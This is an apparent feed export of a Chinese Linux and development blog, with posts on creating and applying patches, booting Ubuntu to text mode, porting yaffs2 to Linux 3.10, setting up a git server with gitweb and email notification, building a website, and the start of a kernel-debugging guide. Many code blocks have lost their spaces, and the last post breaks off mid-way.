    <content type="html"><![CDATA[<p>在团队开发的过程中，经常需要生成patch，或者打上别人提供的patch，那么一般情况是如何操作的呢。</p><p>首先生成patch需要有两个工程，一个修改前的A工程，一个修改后的B工程。</p><p>使用linux命令diff就可以生成patch了。格式如下：</p><pre><code>diff-Naurpath/to/A_Projectpath/to/B_Project&gt;Project.patch`&lt;/pre&gt;  **-N**选项确保补丁文件将正确地处理已经创建或删除文件的情况。 **-a** 将所有文件都当作文本文件处理。 **-u**输出每个修改前后的3行，也可以用-u5等指定输出更多上下文。 **-r**递归。设置后diff会将两个不同版本源代码目录中的所有对应文件全部都进行一次比较，包括子目录文件。生成patch以后，在修改前A工程根目录下使用patch命令打上patch。&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`$cdpath/to/A_Project$patch-p1&lt;Project.patch`&lt;/pre&gt; **  -p Num**忽略几层文件夹&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;为了解释&lt;/span&gt;&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;-p&lt;/span&gt;&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;参数，需要看看如下patch文件片段：&lt;/span&gt; &lt;pre class=&quot;diff source-diff&quot;&gt;`---old/modules/pcitableMonSep2711:03:561999+++new/modules/pcitableTueDec1920:05:412000`&lt;/pre&gt; 如果使用参数-p0，那就表示从当前目录找一个叫做old的文件夹，再在它下面寻找modules/pcitable文件来执行patch操作。 而如果使用参数-p1，那就表示忽略第一层目录（即不管old），从当前目录寻找modules的文件夹，再在它下面找pcitable。如果要取消补丁做出的更改，恢复旧版本，在A工程的根目录下执行以下命令，A工程就会恢复成没有打patch的样子：&lt;pre class=&quot;bash source-bash&quot;&gt;`$patch-RE-p0&lt;Project.patch`&lt;/pre&gt; 由Git管理的工程处理patch的方法：【生成patch】分支master 上是没修改前的，分支patch 上是修改以后的打patch的。1\. 先切换到 patch分支&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`gitcheckoutpatch`&lt;/pre&gt; 2\. 生成patch&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`gitformat-patch-Mmaster`&lt;/pre&gt; &lt;span style=&quot;line-height:1.5;&quot;&gt;会生成一个文件名如：0002-Release-version-1.4.6.patch 的patch文件&lt;/span&gt; &lt;span style=&quot;line-height:1.5;&quot;&gt;【合并patch】&lt;/span&gt; 拿到patch以后，执行下面的命令：&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`gitam0002-Release-version-1.4.6.patch`&lt;/pre&gt; 如果不想直接commit，那么可以用下面这个命令打patch：&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`patch-p1&lt;0002-Release-version-1.4.6.patch</code></pre><p>然后手动commit。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在团队开发的过程中，经常需要生成patch，或者打上别人提供的patch，那么一般情况是如何操作的呢。&lt;/p&gt;
&lt;p&gt;首先生成patch需要有两个工程，一个修改前的A工程，一个修改后的B工程。&lt;/p&gt;
&lt;p&gt;使用linux命令diff就可以生成patch了。格式如下：&lt;/p
      
    
    </summary>
    
    
      <category term="教程" scheme="https://fengguoqing.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu默认启动到文本界面</title>
    <link href="https://fengguoqing.github.io/2013/11/07/Ubuntu%E9%BB%98%E8%AE%A4%E5%90%AF%E5%8A%A8%E5%88%B0%E6%96%87%E6%9C%AC%E7%95%8C%E9%9D%A2/"/>
    <id>https://fengguoqing.github.io/2013/11/07/Ubuntu默认启动到文本界面/</id>
    <published>2013-11-07T02:50:18.000Z</published>
    <updated>2017-11-26T00:12:08.638Z</updated>
    
    <content type="html"><![CDATA[<p> 使用虚拟机安装ubuntu之后感觉机器有点吃力，为了缓解这种压力，直接启动到文本界面，然后使用Xshell或者putty等工具登录，相当的happy。设置方法如下： </p><pre><code>$ sudo vim /etc/default/grub- GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;+ GRUB_CMDLINE_LINUX_DEFAULT=&quot;text&quot;$ sudo update-grub$ sudo reboot</code></pre><p> 重启完之后就直接进入了文件界面，虚拟机的开销就会减小很多了。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 使用虚拟机安装ubuntu之后感觉机器有点吃力，为了缓解这种压力，直接启动到文本界面，然后使用Xshell或者putty等工具登录，相当的happy。设置方法如下： &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo vim /etc/default/grub
- GRUB_C
      
    
    </summary>
    
    
      <category term="日常记录" scheme="https://fengguoqing.github.io/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>基于linux 3.10的yaffs2移植</title>
    <link href="https://fengguoqing.github.io/2013/11/02/%E5%9F%BA%E4%BA%8Elinux-3-10%E7%9A%84yaffs2%E7%A7%BB%E6%A4%8D/"/>
    <id>https://fengguoqing.github.io/2013/11/02/基于linux-3-10的yaffs2移植/</id>
    <published>2013-11-02T05:07:41.000Z</published>
    <updated>2017-11-29T13:23:03.965Z</updated>
    
    <content type="html"><![CDATA[<p>最近想起来还有一块mini2440的开发板很久没有使用了，所以想移植一个基于linux3.10的linux系统，但是在移植yaffs2文件系统的时候出现了一些问题，我将其记录下来给其他同学解决同样的问题提供帮助。</p><p>1. 首先通过git下载yaffs2代码。然后进入yaffs2文件夹中执行patch-ker.sh，给linux源代码打上patch。</p><pre><code>$ git clone git://www.aleph1.co.uk/yaffs2$ cd yaffs2/$ ./patch-ker.sh c m ../linux3.10-mini2440`&lt;/pre&gt; 2\. 然后在linux的源代码fs中多了一个yaffs2的文件夹，到此yaffs2文件系统就已经添加到linux3.10中了。在Linux内核源代码根目录运行：make menuconfig，移动上下按键进行配置：&lt;pre&gt;`File Systems    ---&gt; Miscellaneous filesystems        ---&gt; [*]YAFFS2 file system support`&lt;/pre&gt; 并按空格选中它，这样我们就在内核中添加了yaffs2文件系统的支持，按“Exit”退出内核配置。 3\. 编译linux源代码。&lt;pre&gt;`$ make zImagescripts/kconfig/conf --silentoldconfig Kconfig  CHK     include/generated/uapi/linux/version.h  CHK     include/generated/utsrelease.hmake[1]: `include/generated/mach-types.h&apos; is up to date.  CALL    scripts/checksyscalls.sh  CC      scripts/mod/devicetable-offsets.s  GEN     scripts/mod/devicetable-offsets.h  HOSTCC  scripts/mod/file2alias.o  HOSTLD  scripts/mod/modpost  CHK     include/generated/compile.h  CC      fs/yaffs2/yaffs_ecc.o  CC      fs/yaffs2/yaffs_vfs.ofs/yaffs2/yaffs_vfs.c: In function &apos;yaffs_proc_debug_write&apos;:fs/yaffs2/yaffs_vfs.c:3304: warning: comparison of distinct pointer types lacks a castfs/yaffs2/yaffs_vfs.c: In function &apos;init_yaffs_fs&apos;:fs/yaffs2/yaffs_vfs.c:3398: error: implicit declaration of function &apos;create_proc_entry&apos;fs/yaffs2/yaffs_vfs.c:3399: warning: assignment makes pointer from integer without a castfs/yaffs2/yaffs_vfs.c:3402: error: dereferencing pointer to incomplete typefs/yaffs2/yaffs_vfs.c:3403: error: dereferencing pointer to incomplete typefs/yaffs2/yaffs_vfs.c:3404: error: dereferencing pointer to incomplete typemake[2]: *** [fs/yaffs2/yaffs_vfs.o] Error 1make[1]: *** [fs/yaffs2] Error 2make: *** [fs] Error 2`&lt;/pre&gt; 编译fs/yaffs2/yaffs_vfs.c时出现错误，function &apos;create_proc_entry&apos;没有申明。Google之后才知道原来这个接口在linux-3.10被删除了，应该使用proc_create代替。参考：[What&apos;s coming in 3.10, part 2](https://lwn.net/Articles/549737/)4\. 修改fs/yaffs2/yaffs_vfs.c&lt;pre&gt;`@@ -3384,12 +3384,6 @@ static struct file_system_to_install fs_to_install[] = {        {NULL, 0} };+static const struct file_operations yaffs_fops = {+        .owner = THIS_MODULE,+        .read = yaffs_proc_read,+        .write = yaffs_proc_write,+};+ static int __init init_yaffs_fs(void) {        int error = 0;@@ -3401,9 +3395,9 @@ static int __init init_yaffs_fs(void)        mutex_init(&amp;yaffs_context_lock);        /* Install the proc_fs entries */+       my_proc_entry = proc_create(&quot;yaffs&quot;,+                                         S_IRUGO | S_IFREG, YPROC_ROOT, &amp;yaffs_fops);+#if 0-       my_proc_entry = create_proc_entry(&quot;yaffs&quot;,-                                         S_IRUGO | S_IFREG, YPROC_ROOT);-        if (my_proc_entry) {                my_proc_entry-&gt;write_proc = yaffs_proc_write;                my_proc_entry-&gt;read_proc = yaffs_proc_read;@@ -3411,7 +3405,7 @@ static int __init init_yaffs_fs(void)        } else {                return -ENOMEM;         }+#endif-        /* Now add the file system entries */        fsinst = fs_to_install;`&lt;/pre&gt; 5\. 修改之后保存，然后再编译就可以成功了。&lt;pre&gt;`$ make zImage  CHK     include/generated/uapi/linux/version.h  CHK     include/generated/utsrelease.hmake[1]: `include/generated/mach-types.h&apos; is up to date.  CALL    scripts/checksyscalls.sh  CC      scripts/mod/devicetable-offsets.s  GEN     scripts/mod/devicetable-offsets.h  HOSTCC  scripts/mod/file2alias.o  HOSTLD  scripts/mod/modpost  CHK     include/generated/compile.h  CC      fs/yaffs2/yaffs_vfs.ofs/yaffs2/yaffs_vfs.c: In function &apos;yaffs_proc_debug_write&apos;:fs/yaffs2/yaffs_vfs.c:3304: warning: comparison of distinct pointer types lacks a castfs/yaffs2/yaffs_vfs.c: At top level:fs/yaffs2/yaffs_vfs.c:3389: warning: initialization from incompatible pointer typefs/yaffs2/yaffs_vfs.c:3390: warning: initialization from incompatible pointer type  CC      fs/yaffs2/yaffs_guts.o  CC      fs/yaffs2/yaffs_checkptrw.o  CC      fs/yaffs2/yaffs_packedtags1.o  CC      fs/yaffs2/yaffs_packedtags2.o  CC      fs/yaffs2/yaffs_nand.o  CC      fs/yaffs2/yaffs_tagscompat.o  CC      fs/yaffs2/yaffs_tagsmarshall.o  CC      fs/yaffs2/yaffs_mtdif.o  CC      fs/yaffs2/yaffs_nameval.o  CC      fs/yaffs2/yaffs_attribs.o  CC      fs/yaffs2/yaffs_allocator.o  CC      fs/yaffs2/yaffs_yaffs1.o  CC      fs/yaffs2/yaffs_yaffs2.o  CC      fs/yaffs2/yaffs_bitmap.o  CC      fs/yaffs2/yaffs_summary.o  CC      fs/yaffs2/yaffs_verify.o  LD      fs/yaffs2/yaffs.o  LD      fs/yaffs2/built-in.o  LD      fs/built-in.o  LINK    vmlinux  LD      vmlinux.o  MODPOST vmlinux.o  GEN     .version  CHK     include/generated/compile.h  UPD     include/generated/compile.h  CC      init/version.o  LD      init/built-in.o  KSYM    .tmp_kallsyms1.o  KSYM    .tmp_kallsyms2.o  LD      vmlinux  SORTEX  vmlinux  SYSMAP  System.map  OBJCOPY arch/arm/boot/Image  Kernel: arch/arm/boot/Image is ready  GZIP    arch/arm/boot/compressed/piggy.gzip  AS      arch/arm/boot/compressed/piggy.gzip.o  LD      arch/arm/boot/compressed/vmlinux  OBJCOPY arch/arm/boot/zImage  Kernel: arch/arm/boot/zImage is ready</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近想起来还有一块mini2440的开发板很久没有使用了，所以想移植一个基于linux3.10的linux系统，但是在移植yaffs2文件系统的时候出现了一些问题，我将其记录下来给其他同学解决同样的问题提供帮助。&lt;/p&gt;
&lt;p&gt;1. 首先通过git下载yaffs2代码。然后
      
    
    </summary>
    
    
      <category term="linux移植" scheme="https://fengguoqing.github.io/tags/linux%E7%A7%BB%E6%A4%8D/"/>
    
  </entry>
  
  <entry>
    <title>如何架设Git服务器</title>
    <link href="https://fengguoqing.github.io/2013/08/29/%E5%A6%82%E4%BD%95%E6%9E%B6%E8%AE%BEGit%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://fengguoqing.github.io/2013/08/29/如何架设Git服务器/</id>
    <published>2013-08-29T02:49:10.000Z</published>
    <updated>2017-11-29T13:23:04.026Z</updated>
    
    <content type="html"><![CDATA[<p>在开发的过程中往往需要一个git服务器来管理和保存代码，如何自己架设一个git服务器呢，方法很简单，这里介绍一下如何架设git服务器，搭建gitweb和push代码之后发送邮件通知组内成员。</p><h4 id="1-架设Git服务器"><a href="#1-架设Git服务器" class="headerlink" title="1. 架设Git服务器"></a>1. 架设Git服务器</h4><p>我们以Ubuntu为例。首先，在git服务器上创建一个名为 ‘git’ 的用户，并为其创建一个.ssh目录。并将其权限设置为仅git用户有读写权限 </p><pre><code>$sudoaddusergit$sugit$cd$mkdir.ssh$chmod700.ssh`&lt;/pre&gt; 接下来，把开发者的 SSH 公钥添加到这个用户的authorized_keys文件中。假设你通过电邮收到了几个公钥并存到了临时文件里。重复一下，公钥大致看起来是这个样子：&lt;pre&gt;`$cat/tmp/id_rsa.john.pubssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABAQCB007n/ww+ouN4gSLKssMxXnBOvf9LGt4LojG6rs6hPB09j9R/T17/x4lhJA0F3FR1rP6kYBRsWj2aThGw6HXLm9/5zytK6Ztg3RPKK+4kYjh6541NYsnEAZuXz0jTTyAUfrtU3Z5E003C4oxOj6H0rfIF1kKI9MAQLMdpGW1GYEIgS9EzSdfd8AcCIicTDWbqLAcU4UpkaX8KyGlLwsNuuGztobF8m72ALC/nLF6JLtPofwFBlgc+myivO7TCUSBdLQlgMVOFq1I2uPWQOkOWQAHukEOmfjy2jctxSDBQ220ymjaNsHT4kgtZg2AYYgPqdAv8JggJICUvax2T9va5gsg-keypair`&lt;/pre&gt; 只要把它们逐个追加到authorized_keys文件尾部即可，同时将authorized_keys设置为仅git用户有读写权限。&lt;pre&gt;`$cat/tmp/id_rsa.john.pub&gt;&gt;~/.ssh/authorized_keys$cat/tmp/id_rsa.josie.pub&gt;&gt;~/.ssh/authorized_keys$cat/tmp/id_rsa.jessica.pub&gt;&gt;~/.ssh/authorized_keys$chmod600~/.ssh/authorized_keys`&lt;/pre&gt; 现在可以用--bare选项运行git init来建立一个裸仓库，这会初始化一个不包含工作目录的仓库。&lt;pre&gt;`$cd/opt/git$mkdirproject.git$cdproject.git$git--bareinit`&lt;/pre&gt; 这时，Join，Josie 或者 Jessica 就可以把它加为远程仓库，推送一个分支，从而把第一个版本的项目文件上传到仓库里了。值得注意的是，每次添加一个新项目都需要通过 shell 登入主机并创建一个裸仓库目录。我们不妨以gitserver作为git用户及项目仓库所在的主机名。如果在网络内部运行该主机，并在 DNS 中设定gitserver指向该主机，那么以下这些命令都是可用的：&lt;pre&gt;`#在John的电脑上$cdmyproject$gitinit$gitadd.$gitcommit-m&apos;initialcommit&apos;$gitremoteaddorigingit@gitserver:/opt/git/project.git$gitpushoriginmaster`&lt;/pre&gt; 这样，其他人的克隆和推送也一样变得很简单：&lt;pre&gt;`$gitclonegit@gitserver:/opt/git/project.git$vimREADME$gitcommit-am&apos;fixfortheREADMEfile&apos;$gitpushoriginmaster`&lt;/pre&gt; 用这个方法可以很快捷地为少数几个开发者架设一个可读写的 Git 服务。作为一个额外的防范措施，你可以用 Git 自带的git-shell工具限制git用户的活动范围。只要把它设为git用户登入的 shell，那么该用户就无法使用普通的 bash 或者 csh 什么的 shell 程序。编辑/etc/passwd文件：&lt;pre&gt;`$sudovim/etc/passwd`&lt;/pre&gt; 在文件末尾，你应该能找到类似这样的行：&lt;pre&gt;`git:x:1000:1000::/home/git:/bin/sh`&lt;/pre&gt; 把bin/sh改为/usr/bin/git-shell（或者用which git-shell查看它的实际安装路径）。该行修改后的样子如下：&lt;pre&gt;`git:x:1000:1000::/home/git:/usr/bin/git-shell`&lt;/pre&gt; 现在git用户只能用 SSH 连接来推送和获取 Git 仓库，而不能直接使用主机 shell。尝试普通 SSH 登录的话，会看到下面这样的拒绝信息：&lt;pre&gt;`$sshgit@gitserverfatal:WhatdoyouthinkIam?Ashell?Connectiontogitserverclosed.`&lt;/pre&gt; 这里提供的方法，组内所有成员对project都有读写权限，也就是说每个分支都可以push代码，如果需要更加细致的权限控制，请使用[Gitosis](http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-Gitosis)或者[Gitolite](http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-Gitolite)。&lt;span id=&quot;OSC_h4_2&quot;&gt;&lt;/span&gt;#### 2\. 搭建Gitweb安装gitweb之后就可以通过网站访问我们的项目了。就像&lt;span style=&quot;font-family: Courier,monospace; font-size: 14px; line-height: 18px;&quot;&gt;[http://git.kernel.org](http://git.kernel.org)一样显示了&lt;/span&gt; 首先需要安装Gitweb，如果没有安装apache，那么直接安装Gitweb，也会将apache2安装的。&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$sudoapt-getinstallgitwebapache2`&lt;/pre&gt; 安装完成之后，我们只需要修改一下配置文件，将/etc/gitweb.conf文件中的$projectroot修改为放工程文件的目录。&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$vim/etc/gitweb.conf#pathtogitprojects(&lt;project&gt;.git)$projectroot=&quot;/opt/git&quot;;`&lt;/pre&gt; 至此gitweb就可以使用了，现在可以通过http://[git_server_IP]/gitweb访问了。&lt;span id=&quot;OSC_h4_3&quot;&gt;&lt;/span&gt;#### 3\. Push之后发送邮件通知当组内成员push代码到服务器上之后，会自动发送邮件通知组内所有人员，该次push的具体内容是什么。具体配置方法：一般在安装Git的时候发送邮件的脚本/usr/share/git-core/contrib/hooks/post-receive-email已经存在了，首先要修改所有者和执行权限，并且安装sendmail。&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$sudochowngit:gitpost-receive-email$sudochmod755post-receive-email$sudoapt-getinstallsendmail`&lt;/pre&gt; 然后到切换到工程目录下的hooks中，添加 post-receive软链接指向 /usr/share/git-core/contrib/hooks/ post-receive-email。&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$cd/opt/git/project.git/hooks$ln-s/usr/share/git-core/contrib/hooks/post-receive-emailpost-receive`&lt;/pre&gt; 最后修改工程目录中的config文件即可。mailinglist是邮件列表， &lt;span style=&quot;line-height: 1.5; font-size: 10pt;&quot;&gt;envelopesender是发件人的邮箱，&lt;/span&gt; &lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$vim/opt/git/project.git/config[core]repositoryformatversion=0filemode=truebare=true[hooks]mailinglist=&quot;example@gmail.com,example2@gmail.com&quot;#收件人列表envelopesender=project.git@example.com#送件人地址emailprefix=&quot;[Projectcommit]&quot;#邮件标题前缀showrev=&quot;gitshow-C%s;echo&quot;#不只显示有变化的文件，同时也显示改变的内容`&lt;/pre&gt; 为了使邮件显示的更清楚，还要修改一下工程目录当中的description文件，在description文件中，默认第一行是项目名称，所以要在第一行填入该项目的名称，这个在邮件中会有显示。&lt;pre class=&quot;brush:cpp; toolbar: true; auto-links: false;&quot;&gt;`$vim/opt/git/project.git/descriptionProject_A`&lt;/pre&gt; 我们收到邮件的标题是这样的：&lt;pre class=&quot;brush:html; toolbar: true; auto-links: false;&quot;&gt;`[Projectcommit]Project_Abranchmasterupdated.8811b83e1afb373cbe30d5bc25683d74ace2917c`&lt;/pre&gt; 有时候我们会发现启动和发送sendmail都相当慢，甚至要等两三分钟，完全不能忍，最后通过不断的测试，解决了这个问题，主要是要修改/etc/hosts。例如我的发件人的域是example.com，hostname是desktop，那么就应该这样修改：&lt;pre class=&quot;brush:xml;toolbar: true; auto-links: false;&quot;&gt;`127.0.0.1example.comlocalhostdesktop`&lt;/pre&gt; 改完之后重启sendmail服务:&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`servicesendmailrestart</code></pre><p>然后你就会发现邮件发的那是刷刷滴！</p><p>至此，我们的Git服务器就已经搭建完成了，和你的小伙伴一起快乐的coding吧！</p><p><span id="OSC_h4_4"></span></p><h4 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h4><p><a href="http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">http://git-scm.com/book/zh/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8</a> </p><p><a href="http://josephj.com/entry.php?id=346" target="_blank" rel="noopener">http://josephj.com/entry.php?id=346</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在开发的过程中往往需要一个git服务器来管理和保存代码，如何自己架设一个git服务器呢，方法很简单，这里介绍一下如何架设git服务器，搭建gitweb和push代码之后发送邮件通知组内成员。&lt;/p&gt;
&lt;h4 id=&quot;1-架设Git服务器&quot;&gt;&lt;a href=&quot;#1-架设Git
      
    
    </summary>
    
    
      <category term="教程" scheme="https://fengguoqing.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>建立网站的一般步骤</title>
    <link href="https://fengguoqing.github.io/2013/06/22/%E5%BB%BA%E7%AB%8B%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/"/>
    <id>https://fengguoqing.github.io/2013/06/22/建立网站的一般步骤/</id>
    <published>2013-06-22T12:22:22.000Z</published>
    <updated>2017-11-25T16:33:58.724Z</updated>
    
    <content type="html"><![CDATA[<p>前一段时间在学习怎么建立一个属于自己的网站，现在将这个过程分享给大家，其实建立网站也是很简单的。</p><p><span id="OSC_h3_1"></span></p><h3 id="1-申请域名"><a href="#1-申请域名" class="headerlink" title="1. 申请域名"></a>1. 申请域名</h3><p> 域名就是你网站的网址，取一个比较简洁易记有意义的域名，然后到<a href="https://mya.godaddy.com/" target="_blank" rel="noopener">https://mya.godaddy.com/</a>上注册一个账号，就可以在上面申请属于你的域名了。申请顶级域名是需要付费的，一般价格如下表所示，也有部分比较好的域名价格很贵。如果你无法直接在该网站购买域名，那么你先挑选好域名之后到淘宝上请别人帮你购买。</p><p><a href="http://static.oschina.net/uploads/img/201306/22202218_SPHf.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202219_Z1xc.png" alt="image" title="image"></a></p><p><span id="OSC_h3_2"></span></p><h3 id="2-空间"><a href="#2-空间" class="headerlink" title="2. 空间"></a>2. 空间</h3><p> 空间就是放置网站代码和数据的地方。可以到淘宝上买空间，国外的空间访问可能会比较慢，最好买香港的空间，这样就不需要备案，买空间的时候注意该空间支持的服务器脚本语言，数据库，以及空间大小和数据库大小。 可以先买一个小空间（比如100M）用着，以后比较熟悉了再换。</p><p><a href="http://static.oschina.net/uploads/img/201306/22202219_cWa9.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202220_sK8S.png" alt="image" title="image"></a></p><h3 id="3-CMS"><a href="#3-CMS" class="headerlink" title="3. CMS"></a>3. CMS</h3><p> 利用CMS可以帮你快速建立网站，推荐的CMS有：<a href="http://www.phome.net/" target="_blank" rel="noopener">帝国CMS</a>，<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">Wordpress</a>，<a href="http://www.dedecms.com/" target="_blank" rel="noopener">织梦CMS</a>，<a href="https://drupal.org/home" target="_blank" rel="noopener">Drupal</a>等，建议先安装帝国CMS，因为它会帮你直接将apache和php5安装。如果你要建立个人博客网站，那么<a href="https://cn.wordpress.org/" target="_blank" rel="noopener">Wordpress</a>是一个不错的选择。</p><p><a href="http://static.oschina.net/uploads/img/201306/22202423_9znZ.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202423_NfFT.png" alt="image" title="image"></a><br> 帝国CMS安装目录<br><a href="http://static.oschina.net/uploads/img/201306/22202423_xfyb.png" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201306/22202424_feG4.png" alt="image" title="image"></a><br> Wordpress后台管理界面</p><h3 id="4-上传网站代码"><a href="#4-上传网站代码" class="headerlink" title="4. 上传网站代码"></a>4. 上传网站代码</h3><p> 利用FTP上传利器filezilla将网站代码上传到刚刚购买的空间中。FTP的地址账号密码会在买空间时提供给你。</p><h3 id="5-空间和域名绑定"><a href="#5-空间和域名绑定" class="headerlink" title="5. 空间和域名绑定"></a>5. 空间和域名绑定</h3><p> 将我们申请的域名和空间绑定，也就是DNS解析。具体过程可以参考下面这片文章： <a href="http://www.yidaomi.com/godaddy/7.html" target="_blank" rel="noopener">http://www.yidaomi.com/godaddy/7.html</a>，一段时间之后你就可以在浏览器中通过域名就可以访问你的网站了。</p><h3 id="6-安装网站"><a href="#6-安装网站" class="headerlink" title="6. 安装网站"></a>6. 安装网站</h3><p> 访问你的网站，按照提示一步一步安装你的网站。最后大功告成，一个属于你网站就建成了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前一段时间在学习怎么建立一个属于自己的网站，现在将这个过程分享给大家，其实建立网站也是很简单的。&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;OSC_h3_1&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-申请域名&quot;&gt;&lt;a href=&quot;#1-申请域名&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="教程" scheme="https://fengguoqing.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核调试方法总结</title>
    <link href="https://fengguoqing.github.io/2013/03/12/Linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://fengguoqing.github.io/2013/03/12/Linux内核调试方法总结/</id>
    <published>2013-03-12T08:25:59.000Z</published>
    <updated>2017-11-29T13:23:04.012Z</updated>
    
    <content type="html"><![CDATA[<p><span style="vertical-align:baseline;">内核开发比用户空间开发更难的一个因素就是内核调试艰难。内核错误往往会导致系统宕机，很难保留出错时的现场。调试内核的关键在于你的对内核的深刻理解。</span> </p><h4 id=""><a href="#" class="headerlink" title="**"></a><span style="vertical-align:baseline;">**</span></h4><p> ** </p><p><span id="OSC_h3_1"></span></p><h3 id="一-调试前的准备"><a href="#一-调试前的准备" class="headerlink" title="一 调试前的准备"></a><span style="vertical-align:baseline;">一 调试前的准备</span></h3><p><span style="vertical-align:baseline;">在调试一个bug之前，我们所要做的准备工作有：</span> </p><ul><li><p><span style="vertical-align:baseline;">有一个被确认的bug。</span></p></li><li><p><span style="vertical-align:baseline;">包含这个bug的内核版本号，需要分析出这个bug在哪一个版本被引入，这个对于解决问题有极大的帮助。可以采用二分查找法来逐步锁定bug引入版本号。</span></p></li><li><p><span style="vertical-align:baseline;">对内核代码理解越深刻越好，同时还需要一点点运气。</span></p></li><li><p><span style="vertical-align:baseline;">该bug可以复现。如果能够找到复现规律，那么离找到问题的原因就不远了。</span></p></li><li><p><span style="vertical-align:baseline;">最小化系统。把可能产生bug的因素逐一排除掉。</span> </p></li></ul><p><span style="vertical-align:baseline;"></span> </p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><span style="vertical-align:baseline;"></span></h4><p>  </p><p><span id="OSC_h3_2"></span></p><h3 id="二-内核中的bug"><a href="#二-内核中的bug" class="headerlink" title="二 内核中的bug"></a><span style="vertical-align:baseline;">二 内核中的bug</span></h3><p><span style="vertical-align:baseline;">内核中的bug也是多种多样的。它们的产生有无数的原因，同时表象也变化多端。从隐藏在源代码中的错误到展现在目击者面前的bug，其发作往往是一系列连锁反应的事件才可能出发的。虽然内核调试有一定的困难，但是通过你的努力和理解，说不定你会喜欢上这样的挑战。</span> <span style="font-size:13px;color:#333333;background-color:#FFFFFF;vertical-align:baseline;"></span> </p><h4 id="-2"><a href="#-2" class="headerlink" title=""></a><span style="vertical-align:baseline;"></span></h4><p>  </p><p><span id="OSC_h3_3"></span></p><h3 id="三-内核调试配置选项"><a href="#三-内核调试配置选项" class="headerlink" title="三 内核调试配置选项"></a><span style="vertical-align:baseline;">三 内核调试配置选项</span></h3><p><span style="vertical-align:baseline;">学习编写驱动程序要构建安装自己的内核（标准主线内核）。最重要的原因之一是：内核开发者已经建立了多项用于调试的功能。但是由于这些功能会造成额外的输出，并导致能下降，因此发行版厂商通常会禁止发行版内核中的调试功能。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_4"></span></p><h4 id="1-内核配置"><a href="#1-内核配置" class="headerlink" title="1 内核配置"></a><span style="vertical-align:baseline;">1 内核配置</span></h4><p><span style="vertical-align:baseline;">为了实现内核调试，在内核配置上增加了几项：</span> </p><pre><code>Kernelhacking---&gt;[*]MagicSysRqkey[*]Kerneldebugging[*]Debugslabmemoryallocations[*]Spinlockandrw-lockdebugging:basicchecks[*]Spinlockdebugging:sleep-inside-spinlockchecking[*]CompilethekernelwithdebuginfoDeviceDrivers---&gt;GenericDriverOptions---&gt;[*]DriverCoreverbosedebugmessagesGeneralsetup---&gt;[*]Configurestandardkernelfeatures(forsmallsystems)---&gt;[*]Loadallsymbolsfordebugging/ksymoops`&lt;/pre&gt; &lt;span style=&quot;vertical-align:baseline;&quot;&gt;启用选项例如：&lt;/span&gt; &lt;pre class=&quot;brush:shell; toolbar: true; auto-links: 